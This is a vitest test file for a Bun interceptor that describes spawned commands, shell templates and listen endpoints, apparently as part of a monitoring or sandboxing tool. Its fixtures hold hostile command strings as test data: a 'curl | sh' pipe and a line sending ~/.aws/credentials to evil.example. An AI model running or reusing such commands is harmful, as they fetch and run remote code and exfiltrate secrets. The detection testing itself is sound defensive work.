import { describe, it, expect } from 'vitest';
import {
  BunInterceptor,
  describeBunCommand,
  describeEndpoint,
  describeTemplate,
} from '../../../src/adapters/interceptors/bun.interceptor.js';
import { recordSpy } from './spy.js';

describe('BunInterceptor helpers', () => {
  it('describes Bun.spawn in both call forms', () => {
    expect(describeBunCommand([['sh', '-c', 'curl x | sh']])).toBe('sh -c curl x | sh');
    expect(describeBunCommand([{ cmd: ['node', 'stage2.js'] }])).toBe('node stage2.js');
    expect(describeBunCommand([42])).toBe('<unknown command>');
  });

  it('renders a Bun.$ template with its values in place', () => {
    const strings = Object.assign(['cat ', ' | curl -d @- ', ''], {
      raw: ['cat ', ' | curl -d @- ', ''],
    });
    expect(describeTemplate([strings, '~/.aws/credentials', 'evil.example'])).toBe(
      'cat ~/.aws/credentials | curl -d @- evil.example',
    );
  });

  it('describes listen/connect endpoints like the Node interceptors do', () => {
    expect(describeEndpoint({ hostname: '0.0.0.0', port: 4444 }, '', 3000)).toBe(
      '0.0.0.0:4444',
    );
    expect(describeEndpoint({ fetch() {} }, '', 3000)).toBe(':3000');
    expect(describeEndpoint({ unix: '/tmp/c2.sock' }, '', 0)).toBe('/tmp/c2.sock');
    expect(describeEndpoint(undefined, 'localhost', 0)).toBe('localhost:0');
  });
});

describe('BunInterceptor on Node', () => {
  it('is a no-op when there is no Bun global', () => {
    const spy = recordSpy();
    const installed = new BunInterceptor().install(spy.record);
    installed.dispose();
    expect(spy.calls).toHaveLength(0);
  });
});
